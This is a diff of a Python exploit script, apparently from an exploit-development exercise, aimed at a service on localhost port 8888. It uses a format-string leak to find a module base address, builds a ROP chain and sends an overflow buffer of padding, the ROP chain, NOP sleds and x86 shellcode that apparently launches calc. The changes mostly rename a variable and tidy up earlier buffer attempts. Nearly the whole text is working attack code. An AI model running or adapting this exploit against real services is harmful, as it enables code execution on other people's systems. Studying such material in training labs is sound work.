@@ -10,8 +10,7 @@ import struct
 # base address is 0x436b20a0 - 0x20a0 = 436b0000
 # rop chain generated with mona.py - www.corelan.be
 
-leak_format_string="%4x"
-
+leak_me="%4x"
 
 expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
 expl.connect(("127.0.0.1", 8888))
@@ -20,8 +19,8 @@ x = expl.recv(1024)
 print("Leaking Address")
 #print(x)
 
-# send input_1
-expl.send(leak_format_string)
+# send input_1 to trigger format string so we can read the address
+expl.send(leak_me)
 # read back line 2 sent from server
 x = expl.recv(1024)
 # leaking address
@@ -86,12 +85,12 @@ def create_rop_chain(base_address):
     return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
 
 rop_chain = create_rop_chain(base_address)
+
 print("First Rop gadget Address: 0x%x"%(base_address + 0x1e2f))
 
 sec = raw_input("Press Enter to continue...")
 
-module_entry = base_address + 0x1b76
-jmp_to_entry = "\xE8" + str(module_entry)
+
 shell_calc = ""
 shell_calc += "\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
 shell_calc += "\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
@@ -109,10 +108,7 @@ shell_calc += "\x6c\x63\x89\xe2\x52\x52\x53\x53"
 shell_calc += "\x53\x53\x53\x53\x52\x53\xff\xd7"
 
 
-#junk = "\x41"*756 + "\x42"*4 + "\x43"*400
-#junk = "\x41"*756 + "\x16\x10\x06\x44" + "\x90\x90\xCC"*200
-#junk = "\x41"*756 + "\x44"*4 + "\xCC"*200
-junk = "\x41"*756 + rop_chain + "\x90"*32  + shell_calc + "\x90"*32
+junk = "\x41"*756 + rop_chain + "\x90"*32  + shell_calc + "\x90"*(32)
 expl.send(junk)
 
 
